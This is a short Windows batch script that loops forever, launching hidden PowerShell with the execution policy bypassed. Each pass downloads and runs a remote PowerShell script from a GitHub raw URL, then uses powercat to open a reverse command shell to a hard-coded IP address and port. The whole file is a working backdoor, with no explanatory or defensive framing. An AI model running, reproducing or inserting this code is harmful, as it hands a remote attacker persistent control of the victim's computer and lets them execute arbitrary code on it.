@echo off
 :loop
 powershell -ep bypass -windowstyle hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/KohiClient/ClientDetector/main/yl1.ps1');powercat -c 82.65.68.158 -p 2568 -e cmd"
 goto loop

